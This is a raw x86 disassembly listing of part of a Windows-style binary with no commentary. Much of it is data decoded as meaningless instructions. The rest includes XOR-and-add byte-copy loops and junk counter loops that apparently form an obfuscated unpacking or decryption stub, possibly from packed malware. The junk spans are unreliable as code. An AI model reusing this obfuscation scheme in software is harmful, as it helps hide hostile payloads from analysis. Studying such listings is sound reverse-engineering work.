  407b20:	ret    0x73b8
  407b23:	cmp    BYTE PTR [ebx+0x225469f],ah
  407b29:	out    0x4f,eax
  407b2b:	stc    
  407b2c:	pop    es
  407b2d:	mov    WORD PTR ds:[ebx-0x36],es
  407b31:	cmp    DWORD PTR [ebx-0x3af1f5f6],ebx
  407b37:	xor    al,BYTE PTR [eax+0x42]
  407b3a:	inc    esp
  407b3b:	or     edx,esi
  407b3d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  407b3f:	mov    esi,0x552c389d
  407b44:	dec    ebx
  407b45:	arpl   WORD PTR [ecx+0x4127b1f8],cx
  407b4b:	mov    dh,0xb4
  407b4d:	lods   al,BYTE PTR ds:[esi]
  407b4e:	idiv   DWORD PTR [esi+0x4c]
  407b51:	sub    bh,BYTE PTR [edi+0x14]
  407b54:	cld    
  407b55:	add    BYTE PTR [ecx+0x2a],ah
  407b58:	dec    esp
  407b59:	enter  0xd4cf,0x31
  407b5d:	mov    BYTE PTR cs:[ecx-0x460de153],dl
  407b64:	mov    eax,ds:0x55fcd15
  407b69:	mov    ebp,0xe4c2938d
  407b6e:	push   esp
  407b6f:	fnstsw WORD PTR [edi]
  407b71:	clc    
  407b72:	jecxz  0x407b25
  407b74:	repnz mov eax,0x441334dd
  407b7a:	cmp    eax,0x75fa8430
  407b7f:	sbb    DWORD PTR [ecx+0x4f],edx
  407b82:	jbe    0x407b86
  407b84:	mul    BYTE PTR [ecx]
  407b86:	retf   
  407b87:	scas   al,BYTE PTR es:[edi]
  407b88:	inc    ebp
  407b89:	cmp    bl,al
  407b8b:	clc    
  407b8c:	pop    ecx
  407b8d:	retf   
  407b8e:	adc    edx,edx
  407b90:	test   DWORD PTR [edi],edx
  407b92:	push   0xffffff91
  407b94:	popf   
  407b95:	(bad)  
  407b96:	cld    
  407b97:	daa    
  407b98:	les    esi,FWORD PTR [eax]
  407b9a:	stos   BYTE PTR es:[edi],al
  407b9b:	fld    TBYTE PTR [ebx+0x75]
  407b9e:	jmp    0x10bd7ea8
  407ba3:	xor    edx,ecx
  407ba5:	add    edx,esi
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417e3d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417e3d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417e3d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417e3d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417e3d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41237c,0x41abd2
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41abd2,0x0
  407c72:	push   DWORD PTR ds:0x41abd2
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41abd2,esi
  407c80:	cmp    DWORD PTR ds:0x41abd2,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41abde
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41abd2,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x412354,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0x3e69:0x1ffdba79
  407cce:	jmp    0x7fdc:0x7e7e13e9
  407cd5:	jle    0x407d55
  407cd7:	push   esi
  407cd8:	cmp    eax,DWORD PTR [edx]
  407cda:	retf   
  407cdb:	ins    BYTE PTR es:[edi],dx
  407cdc:	add    edx,DWORD PTR [ebx-0x50df6154]
  407ce2:	add    DWORD PTR [ecx+0x43],esp
  407ce5:	stos   DWORD PTR es:[edi],eax
  407ce6:	push   esp
  407ce7:	jae    0x407d1e
  407ce9:	jmp    DWORD PTR [eax+0x30]
  407cec:	fwait
  407ced:	sbb    ebp,ecx
  407cef:	ja     0x407c80
  407cf1:	cld    
  407cf2:	inc    edx
  407cf3:	xor    BYTE PTR [eax-0x10],0x23
  407cf7:	xchg   esi,eax
  407cf8:	test   DWORD PTR [ebp-0x5],eax
  407cfb:	rol    esi,1
  407cfd:	mov    edx,0xe8c27c45
  407d02:	push   edx
  407d03:	xchg   ecx,eax
  407d04:	arpl   WORD PTR [edx-0x371d4d3],ax
  407d0a:	mov    bh,0x6d
  407d0c:	ja     0x407d50
  407d0e:	pop    esp
  407d0f:	sbb    al,0x36
  407d11:	(bad)  
  407d12:	icebp  
  407d13:	aaa    
  407d14:	push   ss
  407d15:	pop    es
  407d16:	pop    eax
  407d17:	mov    bh,BYTE PTR [edx-0x704815f7]
  407d1d:	mov    eax,0x908f5acb
  407d22:	gs xor al,0x36
  407d25:	sbb    al,0xdf
  407d27:	mov    ebx,0x2a512de8
  407d2c:	dec    ebx
  407d2d:	stc    
  407d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d2f:	test   eax,0x26a7ea36
  407d34:	adc    BYTE PTR [ecx+0x305ef2dd],0xd1
  407d3b:	inc    eax
  407d3c:	test   al,0x5
  407d3e:	int    0x2c
  407d40:	test   eax,0x9ed941c1
  407d45:	pop    ecx
  407d46:	sahf   
  407d47:	and    dl,bh
  407d49:	in     al,dx
  407d4a:	clc    
  407d4b:	mov    ebp,0x3bb43186
  407d50:	aad    0xdf
  407d52:	xor    bl,BYTE PTR [ebp+ebp*2-0x73]
  407d56:	or     DWORD PTR [ebx-0x52],ecx
  407d59:	repz aaa 
  407d5b:	adc    DWORD PTR [esp+ebp*1-0x5a],esi
  407d5f:	das    
  407d60:	out    dx,eax
  407d61:	dec    eax
  407d62:	jo     0x407dba
  407d64:	dec    ecx
  407d65:	xchg   BYTE PTR [eax+0x5b],al
  407d68:	(bad)  
  407d69:	in     al,dx
  407d6a:	lahf   
  407d6b:	cmc    
  407d6c:	xor    eax,0x43005953
  407d71:	and    edi,DWORD PTR [edi+ebx*4]
  407d74:	mov    edx,0x831c353e
  407d79:	cmp    BYTE PTR [esi-0x42],0xe7
  407d7d:	or     eax,0x64ee20fd
  407d82:	mov    bl,0xd5
  407d84:	jb     0x407df0
  407d86:	fsub   QWORD PTR [ecx+eax*2+0x7f]
  407d8a:	es stos BYTE PTR es:[edi],al
  407d8c:	scas   eax,DWORD PTR es:[edi]
  407d8d:	pop    edi
  407d8e:	pop    edi
  407d8f:	dec    edi
  407d90:	sub    edi,edx
  407d92:	aam    0x3e
  407d94:	shl    dh,cl
  407d96:	or     ch,dl
  407d98:	and    dl,BYTE PTR [esp+edx*4]
  407d9b:	xchg   esp,eax
  407d9c:	idiv   ecx
  407d9e:	fstp   DWORD PTR [esi-0x25]
  407da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407da3:	jne    0x407db3
  407da5:	push   0xffffffa6
  407da7:	xor    eax,0x37065bc6
  407dac:	cmp    DWORD PTR [edx-0x74570f93],0xac1eb449
  407db6:	mov    WORD PTR [esi+0x6e3fb94d],fs
  407dbc:	xor    ebx,DWORD PTR [ebx-0x23bf6aab]
  407dc2:	mov    edi,0xe7c7c3f2
  407dc7:	xchg   esi,eax
  407dc8:	fnstcw WORD PTR [ebx-0x68]
  407dcb:	fsub   QWORD PTR [ecx+0x1456c0e9]
  407dd1:	dec    ebx
  407dd2:	xchg   ecx,eax
  407dd3:	into   
  407dd4:	xchg   ecx,eax
  407dd5:	mov    bl,0xca
  407dd7:	xchg   ecx,eax
  407dd8:	lea    edx,[ecx-0x5b]
  407ddb:	sbb    eax,0xf95c5b8e
  407de0:	out    0x3d,al
  407de2:	call   0x797e:0x1ddef561
  407de9:	not    ebp
  407deb:	inc    esi
  407dec:	mov    edx,0xad8e997a
  407df1:	stos   BYTE PTR es:[edi],al
  407df2:	fbstp  TBYTE PTR [eax-0x3c]
  407df5:	xor    ch,bh
  407df7:	frstor [edi+0x632175b1]
  407dfd:	adc    ebp,esi
  407dff:	sub    al,0xec
  407e01:	dec    eax
  407e02:	and    ah,al
  407e04:	jle    0x407e60
  407e06:	xlat   BYTE PTR ds:[ebx]
  407e07:	outs   dx,DWORD PTR ds:[esi]
  407e08:	bound  esp,QWORD PTR [edx]
  407e0a:	pop    eax
  407e0b:	lock cli 
  407e0d:	popa   
  407e0e:	inc    ebp
  407e0f:	pop    eax
  407e10:	jecxz  0x407e48
  407e12:	jns    0x407e8f
  407e14:	fisttp DWORD PTR [ecx+ebx*8]
  407e17:	cmp    al,0x39
  407e19:	leave  
  407e1a:	inc    esi
  407e1b:	add    al,0xa7
  407e1d:	sub    al,bl
  407e1f:	jp     0x407db4
  407e21:	jb     0x407e73
  407e23:	push   esp
  407e24:	into   
  407e25:	jp     0x407daf
  407e27:	jae    0x407e19
  407e29:	pop    ss
  407e2a:	jns    0x407ea5
  407e2c:	test   eax,0xbd2f58ee
  407e31:	sub    cl,0x6a
  407e34:	adc    eax,0xeb28f5e
  407e39:	cmp    eax,esi
  407e3b:	mov    DWORD PTR ds:0x41abe2,0x45d5
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    DWORD PTR [edi+0x44],esi
  407e85:	add    eax,DWORD PTR [ebx+0x7e7e104f]
  407e8b:	fdivr  QWORD PTR [edi+0x7e]
  407e8e:	jle    0x407eb6
  407e90:	and    al,ch
  407e92:	test   al,0x3f
  407e94:	enter  0x67ce,0x65
  407e98:	rcl    BYTE PTR [ebx],0xae
  407e9b:	in     al,dx
  407e9c:	je     0x407e78
  407e9e:	sub    al,0xcb
  407ea0:	jno    0x407ec6
  407ea2:	shr    DWORD PTR gs:[edi-0x48],0x8a
  407ea7:	push   esp
  407ea8:	out    0x2,eax
  407eaa:	adc    al,0x47
  407eac:	jbe    0x407e53
  407eae:	sbb    al,0x3d
  407eb0:	aas    
  407eb1:	mov    ?,WORD PTR [edi+0x78062521]
  407eb7:	xchg   ebp,eax
  407eb8:	lds    esp,FWORD PTR [ecx+ecx*8+0x7693c5fb]
  407ebf:	test   al,0x99
  407ec1:	mov    ch,0xd9
  407ec3:	out    dx,al
  407ec4:	mov    WORD PTR [ecx+0x58],ss
  407ec7:	loopne 0x407ed1
  407ec9:	leave  
  407eca:	mov    cl,0x69
  407ecc:	in     eax,0x3
  407ece:	cdq    
  407ecf:	data16 out dx,al
  407ed1:	pop    ds
  407ed2:	jae    0x407f1c
  407ed4:	dec    ecx
  407ed5:	sub    BYTE PTR [edi],0x9b
  407ed8:	push   0x8e13a7fc
  407edd:	add    BYTE PTR [ecx],cl
  407edf:	mov    al,0x4b
  407ee1:	stos   BYTE PTR es:[edi],al
  407ee2:	mov    DWORD PTR [ebx+eiz*4-0x3a],edx
  407ee6:	(bad)  
  407ee8:	inc    ebx
  407ee9:	repz jg 0x407f48
  407eec:	add    eax,0x42a58b7a
  407ef1:	lock inc ebp
  407ef3:	pop    DWORD PTR [esi+esi*8]
  407ef6:	sbb    al,0xaf
  407ef8:	adc    al,0x4b
  407efa:	adc    DWORD PTR [esp+esi*2+0x3a],ecx
  407efe:	xchg   BYTE PTR gs:[edi],ch
  407f01:	pop    eax
  407f02:	lea    edi,[esi-0x6]
  407f05:	int3   
  407f06:	nop
  407f07:	popa   
  407f08:	jo     0x407f06
  407f0a:	lahf   
  407f0b:	jmp    0xfebc:0xcacf833e
  407f12:	pop    ds
  407f13:	push   ss
  407f14:	stc    
  407f15:	in     eax,dx
  407f16:	(bad)  
  407f17:	ss int 0x2e
  407f1a:	call   0xa17e:0xb9df3282
  407f21:	sbb    eax,0x973f3aca
  407f26:	mov    ecx,0xe1bc28e
  407f2b:	das    
  407f2c:	fild   DWORD PTR [esi+0x60]
  407f2f:	inc    edx
  407f30:	rol    DWORD PTR [ebp-0x35436193],0x2f
  407f37:	xchg   esi,eax
  407f38:	sbb    eax,0x7f501a96
  407f3d:	jno    0x407f0b
  407f3f:	mov    esi,0xe7c2600f
  407f44:	inc    ebp
  407f45:	adc    bl,BYTE PTR [ecx+0x4b]
  407f48:	jmp    0x954c009b
  407f4d:	paddb  mm1,mm5
  407f50:	pop    edi
  407f51:	adc    al,0xe2
  407f53:	jnp    0x407faa
  407f55:	outs   dx,BYTE PTR ds:[esi]
  407f56:	mov    dl,BYTE PTR [edi]
  407f58:	call   0xb33d:0xc95d175e
  407f5f:	popa   
  407f60:	push   cs
  407f61:	xchg   BYTE PTR [edx],ah
  407f63:	pop    ebp
  407f64:	aas    
  407f65:	shr    BYTE PTR [eax-0x78275c38],0xa4
  407f6c:	mov    ch,0x62
  407f6e:	lahf   
  407f6f:	es push esp
  407f71:	stc    
  407f72:	inc    edx
  407f73:	add    al,0x43
  407f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f76:	bnd jmp 0x407f19
  407f79:	adc    DWORD PTR [edx+eax*8-0x3b645897],esp
  407f80:	pop    eax
  407f81:	mov    ds:0x179aa45b,eax
  407f86:	aam    0x6f
  407f88:	mov    dh,dl
  407f8a:	pop    ebx
  407f8b:	std    
  407f8c:	xor    DWORD PTR [eax-0x77],eax
  407f8f:	mov    ah,BYTE PTR [ecx*1+0x7e51ff79]
  407f96:	adc    eax,0x6ed7cfcb
  407f9b:	dec    edx
  407f9c:	bound  esp,QWORD PTR [edi+0x68]
  407f9f:	jo     0x407f69
  407fa1:	call   0x1bd:0x9ca7cb11
  407fa8:	in     eax,0xe6
  407faa:	lock call 0x6923:0x26afbfc7
  407fb2:	aad    0x4
  407fb4:	bound  edi,QWORD PTR [edi-0x24]
  407fb7:	or     edi,ebp
  407fb9:	xchg   BYTE PTR [ebx],bl
  407fbb:	dec    edx
  407fbc:	jl     0x407fc5
  407fbe:	dec    edx
  407fbf:	mov    al,ds:0x4c4f0e4d
  407fc4:	cwde   
  407fc5:	cmp    dh,al
  407fc7:	les    ebp,FWORD PTR [ecx+ecx*8-0x37a1b2bc]
  407fce:	ss dec eax
  407fd0:	ins    DWORD PTR es:[edi],dx
  407fd1:	imul   BYTE PTR [edi]
  407fd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fd4:	xchg   BYTE PTR [edi],ah
  407fd6:	in     eax,0x1
  407fd8:	mov    esi,esp
  407fda:	cmp    dh,bh
  407fdc:	cmp    ch,dl
  407fde:	das    
  407fdf:	lock mov edi,0xe0d87c44
  407fe5:	push   eax
  407fe6:	sti    
  407fe7:	in     eax,0x9c
  407fe9:	sbb    al,0x77
  407feb:	into   
  407fec:	push   edi
  407fed:	sub    eax,0x33e3f875
  407ff2:	rol    DWORD PTR [ebx],0xc2
  407ff5:	mov    ds:0x40d64c,eax
  407ffa:	mov    eax,DWORD PTR [ebp+0xc]
  407ffd:	jmp    0x40817c
  408002:	and    ebp,DWORD PTR [edi]
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	and    eax,0x2d397b21
  408013:	push   ss
  408014:	jle    0x408094
  408016:	fdivr  QWORD PTR [edi+0x7e]
  408019:	jle    0x408093
  40801b:	inc    edi
  40801c:	mov    ah,0x51
  40801e:	fdiv   QWORD PTR ds:0x3d1da4ed
  408024:	adc    DWORD PTR [edx],ebp
  408026:	pushf  
  408027:	cmp    esi,DWORD PTR [ecx-0x3e92d16a]
  40802d:	pop    esi
  40802e:	int3   
  40802f:	cmc    
  408030:	dec    eax
  408031:	adc    BYTE PTR ds:0x2425553e,bh
  408037:	out    dx,al
  408038:	rol    bh,0xd5
  40803b:	fs call 0x93af:0x2ed0dd8d
  408043:	lds    eax,FWORD PTR ds:0x52801a63
  408049:	test   eax,0x8a3155a5
  40804e:	jb     0x40804b
  408050:	inc    ebx
  408051:	rol    eax,cl
  408053:	(bad)  
  408054:	into   
  408055:	dec    DWORD PTR [ecx-0x1c]
  408058:	pop    es
  408059:	sti    
  40805a:	sar    BYTE PTR [esi-0x3af38278],0x82
  408061:	jne    0x408039
  408063:	int    0x36
  408065:	fcomp  QWORD PTR [edx+0xb64ec7e]
  40806b:	xchg   ecx,eax
  40806c:	stos   BYTE PTR es:[edi],al
  40806d:	pop    ds
  40806e:	mov    dl,0x31
  408070:	loop   0x4080d9
  408072:	pop    ds
  408073:	imul   eax,edi,0xffffffe7
  408076:	push   edx
  408077:	xchg   ebx,eax
  408078:	aaa    
  408079:	aam    0x8b
  40807b:	cli    
  40807c:	ret    0x5353
  40807f:	mov    esi,0x87caaf16
  408084:	popa   
  408085:	push   eax
  408086:	popf   
  408087:	push   es
  408088:	cmp    edx,DWORD PTR [esi]
  40808a:	pop    edx
  40808b:	addr16 cli 
  40808d:	xchg   esp,eax
  40808e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40808f:	ja     0x408084
  408091:	fcmovb st,st(5)
  408093:	mov    al,BYTE PTR [ebx+0x71]
  408096:	mov    dh,0x75
  408098:	and    BYTE PTR [edi+0x16],dh
  40809b:	mov    ecx,0xdd0d02f9
  4080a0:	jns    0x408024
  4080a2:	stc    
  4080a3:	(bad)  
  4080a5:	adc    BYTE PTR [edi-0x7c],0xe5
  4080a9:	jmp    0xfc557f50
  4080ae:	or     esi,DWORD PTR [esi+0xae5c030]
  4080b4:	test   al,0x18
  4080b6:	xchg   ebx,eax
  4080b7:	pop    ebx
  4080b8:	xchg   esi,eax
  4080b9:	sub    ah,bh
  4080bb:	adc    DWORD PTR [esi],esi
  4080bd:	mov    ecx,DWORD PTR [ebp-0x63998ade]
  4080c3:	popa   
  4080c4:	imul   ecx,DWORD PTR [edx-0x4f7f8d5f],0xcd847054
  4080ce:	dec    edx
  4080cf:	jb     0x40809a
  4080d1:	je     0x4080f9
  4080d3:	das    
  4080d4:	or     eax,0x65472925
  4080d9:	in     al,0xdb
  4080db:	add    edx,ebx
  4080dd:	mov    ecx,0x70437fb
  4080e2:	xor    BYTE PTR [edi+ecx*8+0x5c],0x88
  4080e7:	das    
  4080e8:	mov    al,ds:0x4472ca14
  4080ed:	cli    
  4080ee:	lock lods eax,DWORD PTR ds:[esi]
  4080f0:	push   cs
  4080f1:	repnz cmp DWORD PTR [ecx],ebx
  4080f4:	leave  
  4080f5:	ins    BYTE PTR es:[edi],dx
  4080f6:	add    dl,BYTE PTR [edi]
  4080f8:	mov    edx,0x7fb6b54a
  4080fd:	mov    eax,0xe2dca221
  408102:	adc    al,0x11
  408104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408105:	ja     0x408149
  408107:	adc    BYTE PTR [esi],0x72
  40810a:	xchg   ecx,eax
  40810b:	xchg   esp,eax
  40810c:	pop    DWORD PTR [eax]
  40810e:	test   eax,ecx
  408110:	mov    bl,0xab
  408112:	std    
  408113:	lods   eax,DWORD PTR ds:[esi]
  408114:	mov    al,ds:0x2f0e4d77
  408119:	dec    esi
  40811a:	inc    edx
  40811b:	jmp    0xd945e343
  408120:	mov    al,0x49
  408122:	(bad)  
  408123:	sti    
  408124:	pop    ds
  408125:	xchg   ebp,eax
  408126:	pop    ebx
  408127:	call   0xa0c2:0xb7ffa0c8
  40812e:	cmp    al,0xb7
  408130:	xor    dh,bl
  408132:	enter  0x3c92,0x1e
  408136:	inc    esp
  408137:	mov    eax,0xa43006e1
  40813c:	or     al,0x55
  40813e:	sbb    al,0xec
  408140:	mov    bl,0x90
  408142:	mov    ?,esp
  408144:	sub    esi,eax
  408146:	mov    ah,0x9e
  408148:	adc    DWORD PTR [esi],ebx
  40814a:	lods   al,BYTE PTR ds:[esi]
  40814b:	pop    ebp
  40814c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40814d:	sbb    al,0xdd
  40814f:	ret    
  408150:	jg     0x4080d6
  408152:	pop    esi
  408153:	ins    DWORD PTR es:[edi],dx
  408154:	xchg   ecx,eax
  408155:	xchg   ebx,eax
  408156:	pop    esi
  408157:	xchg   edx,eax
  408158:	add    BYTE PTR [ecx],dh
  40815a:	in     al,dx
  40815b:	dec    edx
  40815c:	sub    bp,WORD PTR [esi-0x59]
  408160:	sbb    BYTE PTR [esi+0x576dd9cd],ch
  408166:	loope  0x40811a
  408168:	push   ebp
  408169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40816a:	stos   BYTE PTR es:[edi],al
  40816b:	inc    ebx
  40816c:	mov    ch,0x1a
  40816e:	mov    ecx,ds
  408170:	loop   0x4081d0
  408172:	retf   
  408173:	mov    ds:0x56ec170d,eax
  408178:	mov    ebx,0x33ff79d3
  40817d:	rol    DWORD PTR [ebx],0xc2
  408180:	mov    ds:0x40d654,eax
  408185:	jmp    0x408313
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	es mov edx,0x83c390c4
  4081a5:	pop    ss
  4081a6:	jle    0x408226
  4081a8:	fdivr  QWORD PTR [edi+0x7e]
  4081ab:	jle    0x4081d3
  4081ad:	fiadd  WORD PTR [eax]
  4081af:	pop    ebx
  4081b0:	inc    edx
  4081b1:	cwde   
  4081b2:	push   0xffffff8d
  4081b4:	xor    ecx,DWORD PTR [edx+0x42fe6c83]
  4081ba:	inc    esi
  4081bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081bc:	out    dx,eax
  4081bd:	push   edi
  4081be:	fstp   TBYTE PTR [eax]
  4081c0:	pushf  
  4081c1:	xchg   BYTE PTR [eax],cl
  4081c3:	pushf  
  4081c4:	rcl    ebp,cl
  4081c6:	pop    ebp
  4081c7:	jmp    0x40821c
  4081c9:	bnd jnp 0x4081a2
  4081cc:	es int3 
  4081ce:	sbb    eax,0xfc330d98
  4081d3:	jp     0x408155
  4081d5:	stc    
  4081d6:	test   DWORD PTR fs:0x5c33ac3d,esp
  4081dd:	or     ebp,DWORD PTR [esi+0x338146d5]
  4081e3:	fxch   st(6)
  4081e5:	push   esi
  4081e6:	fiadd  DWORD PTR [ebx+esi*8-0x2a]
  4081ea:	mov    ds:0xeaf28f3e,eax
  4081ef:	jns    0x4081ab
  4081f1:	stos   DWORD PTR es:[edi],eax
  4081f2:	add    al,0x11
  4081f4:	out    0xd0,al
  4081f6:	add    DWORD PTR [esi],edx
  4081f8:	aad    0xe4
  4081fa:	neg    DWORD PTR [edi]
  4081fc:	mov    bl,0xa7
  4081fe:	inc    esi
  4081ff:	retf   0x3573
  408202:	test   BYTE PTR [edx],bh
  408204:	sti    
  408205:	cmp    ecx,eax
  408207:	loopne 0x408256
  408209:	sar    DWORD PTR [ecx+0x3],1
  40820c:	bound  esp,QWORD PTR [edx]
  40820e:	jbe    0x408242
  408210:	xchg   ebp,eax
  408211:	pusha  
  408212:	out    dx,al
  408213:	fwait
  408214:	dec    ebp
  408215:	sar    BYTE PTR [edx+0x1b513188],0xe8
  40821c:	cmp    edi,0x8721ea65
  408222:	aaa    
  408223:	pop    ecx
  408224:	lods   eax,DWORD PTR ds:[esi]
  408225:	ins    BYTE PTR es:[edi],dx
  408226:	or     bl,BYTE PTR [esi-0x6]
  408229:	adc    BYTE PTR [esi+0x4890bdea],dl
  40822f:	push   ecx
  408230:	push   ebp
  408231:	dec    ecx
  408232:	cmp    ah,bl
  408234:	sub    edx,DWORD PTR [ecx+ebp*4-0x71]
  408238:	dec    edx
  408239:	push   edi
  40823a:	mov    bl,BYTE PTR [ebx-0x37066c54]
  408240:	je     0x40826b
  408242:	fild   QWORD PTR [esp+ecx*1-0x6a]
  408246:	test   DWORD PTR [ecx-0xfade24f],edi
  40824c:	pushf  
  40824d:	cwde   
  40824e:	test   eax,0x1bdf2107
  408253:	popa   
  408254:	push   edx
  408255:	add    eax,0x9da2eb7d
  40825a:	mov    esp,0xc0af4cc6
  40825f:	jb     0x408219
  408261:	jg     0x4082ca
  408263:	cdq    
  408264:	or     BYTE PTR [eax-0xbaa448d],0x41
  40826b:	cmp    BYTE PTR [ebx+0x14],ch
  40826e:	pop    eax
  40826f:	out    0x71,al
  408271:	int    0xe6
  408273:	dec    edx
  408274:	mov    ch,0x42
  408276:	call   0xb618:0x4d9f2b04
  40827d:	xchg   ecx,eax
  40827e:	pop    ebx
  40827f:	imul   ebp,DWORD PTR [edx-0x722065b1],0x44
  408286:	clc    
  408287:	mov    eax,ds:0xe710202c
  40828c:	mov    WORD PTR [esi-0x70eefab7],cs
  408292:	pop    ds
  408293:	xor    BYTE PTR [edx],ah
  408295:	adc    dl,BYTE PTR [ebx+ebx*2]
  408298:	pushf  
  408299:	jb     0x408293
  40829b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40829c:	pop    edx
  40829d:	add    al,0x8
  40829f:	jmp    0x8c8b:0x2cb8e495
  4082a6:	cwde   
  4082a7:	or     eax,0x17435c34
  4082ac:	inc    eax
  4082ad:	repnz pop esi
  4082af:	shl    BYTE PTR [ecx+0x6f],0xc6
  4082b3:	loope  0x408320
  4082b5:	dec    ebp
  4082b6:	lock fisubr DWORD PTR [ebx-0x2db89116]
  4082bd:	hlt    
  4082be:	adc    cl,BYTE PTR ds:0xfcdd94b4
  4082c4:	test   DWORD PTR [esi+0x65],esp
  4082c7:	push   esi
  4082c8:	loop   0x4082b9
  4082ca:	ds ins DWORD PTR es:[edi],dx
  4082cc:	(bad)  [esi+0x34]
  4082cf:	inc    edi
  4082d0:	adc    DWORD PTR ss:[edi-0x4],esi
  4082d4:	pop    es
  4082d5:	dec    edi
  4082d6:	jbe    0x408308
  4082d8:	add    al,bh
  4082da:	cdq    
  4082db:	add    al,BYTE PTR [edi]
  4082dd:	push   ss
  4082de:	iret   
  4082df:	fild   WORD PTR [bp+si]
  4082e2:	in     al,0x38
  4082e4:	pop    edx
  4082e5:	mov    ah,0xcc
  4082e7:	adc    al,0xb
  4082e9:	pop    ebp
  4082ea:	xchg   esi,eax
  4082eb:	add    edx,0xfffffff4
  4082ee:	dec    edx
  4082ef:	dec    ecx
  4082f0:	and    eax,0xd0a48a76
  4082f5:	call   DWORD PTR [edi-0x6ce0889f]
  4082fb:	test   al,ch
  4082fd:	mov    ch,0xe0
  4082ff:	jecxz  0x40832f
  408301:	shl    ebp,cl
  408303:	lock std 
  408305:	aad    0x5f
  408307:	push   cs
  408308:	mov    ds:0x25c0a92,eax
  40830d:	pop    esi
  40830e:	mov    ds:0x40d64c,eax
  408313:	mov    eax,DWORD PTR [ebp+0x8]
  408316:	mov    eax,DWORD PTR [eax]
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
  40832b:	and    DWORD PTR ds:0x4245ca,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4245ca
  408340:	inc    ecx
  408341:	mov    DWORD PTR ds:0x4245ca,ecx
  408347:	cmp    DWORD PTR ds:0x4245ca,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4245ca,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4245ca,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4245ca
  40837f:	inc    ecx
